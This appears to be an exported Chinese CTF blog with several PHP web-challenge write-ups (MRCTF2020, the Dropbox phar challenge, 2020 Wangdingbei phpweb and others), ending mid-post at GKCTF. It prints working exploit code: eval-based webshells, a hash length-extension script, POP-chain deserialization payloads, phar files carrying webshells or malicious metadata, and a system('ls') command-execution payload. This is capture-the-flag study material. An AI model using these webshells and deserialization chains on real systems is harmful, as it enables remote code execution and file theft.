HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); flag说是在phpinfo当中,构造如下： 12345678910111213141516171819&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$a = new HelloPhp();echo serialize($a); Ezinclude 第一步，这里说是cookies里面有一个hash，是hash拓展攻击： 123456789101112131415import requestsimport hashpumpyimport urlliburl=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;for i in range(40): a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i) req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) if &#x27;username/password error&#x27; not in req.text: print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) ?然而实际做的时候把cookies的值丢进去当作password的就过去了。 读取到三个php文件： flflflflag.php 12345678&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; index.php 123456789101112131415161718&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; config.php 1234&lt;?php$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;?&gt; 用dirb还能扫出来一个dir.php 123456789&lt;body&gt; array(2) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; &#125; include($_GET[&quot;file&quot;])&lt;/body&gt; 这里会列出tmp目录下的所有文件， 那看来还是要写🐎进去啊，可是伪协议被过滤了该怎么写🐎呢？ 参考文章： 1https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046 从这篇文章中我们可以知道，当PHP陷入崩溃的时候他会自动的重启，清理掉自己的内存，但是与此同时这就会导致PHP会停止自己手头的工作，这样的话于此同时我们直接POST一段数据，将会被php保存至tmp目录下没有停下。随机生成一个文件，但是又根据题目的dir.php，可以让我们看见tmp目录下有什么，所以直接包裹即可~ 抄来的exp： 123456789101112import requestsfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;file_data=&#123; &#x27;file&#x27;: BytesIO(payload.encode())&#125;url=&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=file_data,allow_redirects=False)except: print(1) 重点就是用string.strip_tags这一点构造出php的内存溢出即可得到。之后访问dir.php可以看见有什么文件成功上传： 进行文件包含即可 flag一样的PHP info（）当中","categories":[],"tags":[]},{"title":"MRCTF2020","slug":"MRCTF2020","date":"2020-10-29T09:51:51.000Z","updated":"2020-10-29T12:44:36.831Z","comments":true,"path":"2020/10/29/MRCTF2020/","link":"","permalink":"http://example.com/2020/10/29/MRCTF2020/","excerpt":"","text":"怎么说呢。。是新手题目，又不太像，有些题目脑洞有点大 1.套娃读源码： 12345678$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; 其中可以看见过滤_和%5f，那我们编码绕过就无办法了啊，但是找到参考文献： 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html 其中对这种的绕过 于是我们构造空格来绕过： 1&#x2F;?b%20u%20p%20t&#x3D;23333%0a 之后在secrettw.php中，JSfcuk翻译即可得到让传值读取源码： 读取到源码如下： 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 其中对IP进行了一次check，XFF不可用，用Clinet-IP即可绕过 之后看上面的简单函数的逆向，把加号改成减号就行了 1234567891011121314151617181920&lt;?php$v = &quot;fj]a&amp;f\\b&quot;;function unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re;&#125;function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re;&#125;echo (change(&quot;ZmpdYSZmXGI=&quot;)); 比较恶心到人的是2333的输出，我之前无论如何输入都不行，一度怀疑人生，最后找到data的伪协议可以绕过，参考文章： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043 最后成功拿到flag，flag在源码中： 2.你传你🐎呢分别上传.htaccess和一句话即可： 一句话用asp的格式： 1&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt; 之后用蚁剑🔗拿flag即可，这道题我比较奇怪的就是过滤了很多东西，但是又没啥用,我猜测是出题人过滤不够？不然可以用disable_function的来做的,过滤如下：k’h’j 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld 3.Ez_bypassMD5强等于绕过和弱等于绕过： 当然也可以用下面这两组数： 123hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27; 第二步； 4.PYWebsite 看到这句话，直接伪造XFF即可 5.Ezpop首先审计源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 我自己审计的时候感觉有点懵，首先我们可能要用到的是include这么一个函数，而var函数会在__invoke的时候去调用$var，进行文件包含，于是我们构造如下： 1$var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; 接着就是去找哪里可以调用到这么一个__invoke方法了，根据PHP的手册，我们会在 函数被当成方法调用的时候自动调用，例子如下： 123$mod = new Modifier();$mod();//在下面则会自动调用invoke方法 往下看就能看见Test方法，因为它返回了一个function。所以让Test去get 一下Modifier类，就会先调用__get方法，结果因为被当成了函数进行调用，我们的Modifier类自动的调用了invoke方法。 然后我卡在这里好久..最后看了师傅们的博客才想到该怎么写..说实话还是有点懵逼 1234567891011 public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; 在show函数当中，我们需要找到__wakeup函数，因为它进行了echo操作，此时便会触发string函数 修改source的值。 最后要注意protected属性修饰的变量应该用urlencode进行修饰避免不可见字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; &#125; public function __wakeup()&#123;// phpinfo(); if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p;// private $c; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123;// phpinfo(); $function = $this-&gt;p; return $function(); &#125;&#125;$test = new Test();$mod = new Modifier();$show1 = new Show();$show1 -&gt;str =$test;$show1-&gt;str-&gt;p = $mod;$show2 = new Show($show1);echo urlencode(serialize($show2));//当我们触发 这里就是进行了一个套娃，当反序列化的时候呢，show方法被反序列化，调用了wakeup的函数，之后又因为 __construct,进行了一句输出，所以就造成了toString调用，在此之前我们构造好语句即可 $show2 纯粹的是进行一次wakeup调用！ 6.Ezadult页面啥也看不出来，直接www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本： 123456789101112str1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;str2 = &#x27;KVQP0LdJKRaV3n9D&#x27;str3 = str1[::-1]res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res)#结果 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 下载php_mt_rand那个脚本，使用教程： 记得用make编译c语言的东西，之后./运行即可： 跑出公钥来：1775196155 12345678910111213141516171819202122&lt;?phpmt_srand(1775196155);//公钥function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;&#125;//私钥function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key();echo private_key();?&gt; 之后密码用万能密码一过，即可得到flag 后面的两个一个太难一个是题目down掉了完全用不了。。","categories":[],"tags":[]},{"title":"华北赛区Dropbox","slug":"华北赛区Dropbox","date":"2020-10-29T05:49:57.000Z","updated":"2020-11-17T06:08:52.547Z","comments":true,"path":"2020/10/29/华北赛区Dropbox/","link":"","permalink":"http://example.com/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/","excerpt":"","text":"1.知识点学习1.1 phar流自PHP5.3.0开始，php便支持该数据流 支持allow_url_fopen no 支持allow_url_include No 允许读取 Yes 允许写入 Yes 在PHP的官网手册当中，该流用于解压phar文件，我们允许利用该流直接读取被压缩的phar文件，但是我们实战中却发现，该流允许我们读取任意一个文件，只要他们是经过压缩的文件，PHP会自动的解压文件，并且读取里面的PHP。 phar的参考文章： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701 （感觉PHP有点垃圾..使用Phar文件，但是却完全没有任何的过滤，他将识别任何模块的后缀，直接将其解压，之后读取其中的PHP文件 例如我们构造一个test.php，我们将其压缩成test.zip，之后修改zip后缀为jpg，他还是会能够识别，并且读取其中的文件 1.1.1 phar写🐎文件包含测试的代码如下： index.php 1234&lt;?php //phar://./test.jpg/test.phpinclude($_POST[&#x27;url&#x27;]);?&gt; test.php 1&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; 我们可以利用如下代码生成一个phar文件，并且生成🐎 12345678910111213&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub;//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.php&quot;, &quot;&lt;?php eval(\\$_POST[123]); ?&gt;&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 利用如下： 1.1.2 phar反序列化在以前的大部分事件，我们都是利用反序列化的函数，但是人们现在安全意识越来越高之后，这种利用方式越来越难。 但是Phar://读取文件phar的时候，会反序列化meta-data储存的信息 Phar文件的一个标准特征如下： 12&lt;?php __HALT_COMPILER(); ?&gt; O:10:&quot;TestObject&quot;:0:&#123;&#125;\b test.tx\u0002 GBMB 我们可以发现Meta-data的内容就是以反序列化的形式储存的，利用Phar协议解析的时候都会反序列化，同时文件操作函数一般都能用伪协议流，所以Phar://的供给面还是相当广的。 所以满足如下条件的时候该类型序列化可以使用： 可以上传Phar文件(或者文件自己使用Phar读取) 具有可利用的魔术方法 文件操作函数的参数可用 例题：[SWPUCTF 2018]SimplePHP 首先就尝试读取一波文件file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; Class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; 同时还拥有一个f1ag.php 直接访问的话会不允许，在show类当中放出了提示，pahr://phar.jpg 查找POP链的过程是这样的： Test的$text = base64_encode(file_get_contents($value));作为我们的终极目标 我们查看$value是从哪里传来的，发现一行： 1$value = $this-&gt;params[$key]; 之后查看，发现$key通过__get进行传导 于是构造 1$c-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; 回到上面看，因为之前有echo，通过echo查找tostring 于是对source进行控制 1$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; 对A进行反序列化即可。 1.2 open_basedir该函数是php用于基于x目录允许，利用该函数，PHP可以限制用户的读取文件范围，这也就很好的解释了为什么我们只能读取到../../index.php的内容，而无法读取到根目录下flag.txt的文件了 2.做题思路1.任意文件读取这道题允许下载文件，上传文件和删除文件，我们下载文件的时候可以任意修改文件名（但是由于open_basedir的限制，我们没法办法读取到flag 故利用如下方式能够找到class.php,index.php,download.php,delete.php的内容 2.构造phar反序列化根据前面的知识，我们知道我们可以利用phar生成文件，构造pop链读取文件，问题就在于如何构造pop了，我们在这道题很明显要找到的函数就是file_get_contents，能找到File类下的close()类会使用，于是查找全文当中，看看有没有魔术方法能够使用到close类： 最终在User类中查找到： 1234567891011121314class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; // 中间略 public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125; 于是第一次我尝试如此构造文件： 1234567891011121314151617181920&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125; 结果在本地fuzz的时候就发现这样子就压根没回显啊。后来才知道必须输出一下才能看见内容。。 1234567class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; echo file_get_contents($this-&gt;filename); return file_get_contents($this-&gt;filename); &#125;&#125; 于是就卡住了，上下再审计代码，找一个echo函数，发现恰好就在FileList当中。。： 1234567891011121314151617public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; //这句是全局的核心 $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; 想办法，能够控制result，发现题目也正好给出了call这个魔术方法： 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; 自己看了一些，这个其实就是一个手写的回调函数嘛。 于是尝试思考，我们可以通过FileList出发 12345678910111213141516class User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs;public function __construct($path) &#123; $files = new File(); $this-&gt;funcs = array($files); $filenames =&quot;/flag.txt&quot;; &#125;&#125; 我们先new一个User类出来，并将db指向FileList，之后类会被销毁，将会调用FileList当中的call方法，call方法需要我们指定参数名和filename，所以在__construct中进行修改,最终调试得 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close();// phpinfo(); &#125;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;test.txt&quot;; $this-&gt;files = array($file);// var_dump($file);// phpinfo(); &#125; public function __call($func, $args) &#123;// phpinfo(); foreach ($this-&gt;files as $file) &#123;// var_dump( $file-&gt;$func()); //将result设置成test.txt当中的内容 $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123;//销毁的时候就会被输出了！ foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table = &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= htmlentities($value); &#125; $table .= htmlentities($filename); &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();?&gt; 调试成功之后构造exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass User &#123; public $db;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;/flag.txt&quot;; $this-&gt;files = array($file); &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();@unlink(&quot;5.phar&quot;);$phar = new Phar(&quot;5.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub;$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest //如果我们是要写phar🐎就用下面的，不然就用上面的setMeatadata$phar-&gt;addFromString(&quot;test.php&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 之后用burp上传，删除的时候读取文件即可：","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"2020网鼎杯phpweb","slug":"2020网鼎杯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-11-17T06:15:44.475Z","comments":true,"path":"2020/10/28/2020网鼎杯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.访问页面curl+u，可以查看到这些： 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; 这样的话我们推测它就是用了一个call_user_func的回调函数.. 然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件， 于是构造： 得到源码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确 2.构造payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); 之后将这一段带入到题目当中，最终在tmp目录下找到","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-11-17T06:17:52.979Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"抽空把GKCTF的题目刷了，先从第一题开始说吧 1.Check in说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了 第一步访问就能审计到代码： 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; 